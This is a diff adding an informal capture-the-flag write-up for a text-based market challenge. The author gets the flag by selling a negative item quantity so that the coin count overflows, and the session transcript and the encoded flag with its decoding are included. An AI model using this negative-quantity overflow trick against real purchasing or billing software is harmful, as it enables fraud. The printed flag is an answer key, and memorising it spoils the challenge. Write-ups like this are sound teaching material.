@@ -1,0 +1,59 @@
+after opening the shop and seeing that 
+i dont have enough money for a fruitful flag
+i immediatly looked into the sell an item to get
+the required money
+
+then i saw that my inventory was also empty
+but that would stop me from selling negative
+items, after doing that i acquired negative
+money and i realised i just needed to make 
+the integer perform an underflow
+
+>> pow(2,32)//100
+
+is how i got the number of fruitful flags
+to sell, and this is the rest
+
+Welcome to the market!
+=====================
+You have 40 coins
+	Item		Price	Count
+(0) Quiet Quiches	10	12
+(1) Average Apple	15	8
+(2) Fruitful Flag	100	1
+(3) Sell an Item
+(4) Exit
+Choose an option:
+3
+Your inventory
+(0) Quiet Quiches	10	0
+(1) Average Apple	15	0
+(2) Fruitful Flag	100	0
+What do you want to sell?
+2
+How many?
+-42949672
+You have 136 coins
+	Item		Price	Count
+(0) Quiet Quiches	10	12
+(1) Average Apple	15	8
+(2) Fruitful Flag	100	1
+(3) Sell an Item
+(4) Exit
+Choose an option:
+2
+How many do you want to buy?
+1
+Flag is:  [112 105 99 111 67 84 70 123 98 52 100 95 98 114 111 103 114 97 109 109 101 114 95 98 97 54 98 56 99 100 102 125]
+
+i noticed all values are valid asciis so i 
+decided to quickly convert them with python
+
+$ echo '[112 105 99 111 67 84 70 123 98 52 100 95 98 114 111 103 114 97 109 109 101 114 95 98 97 54 98 56 99 100 102 125]' | tr ' ' ','
+[112,105,99,111,67,84,70,123,98,52,100,95,98,114,111,103,114,97,109,109,101,114,95,98,97,54,98,56,99,100,102,125]
+$ python
+>>> a = [112,105,99,111,67,84,70,123,98,52,100,95,98,114,111,103,114,97,109,109,101,114,95,98,97,54,98,56,99,100,102,125]
+>>> for c in a:
+...     print(chr(c),end='')
+
+and we got the flag
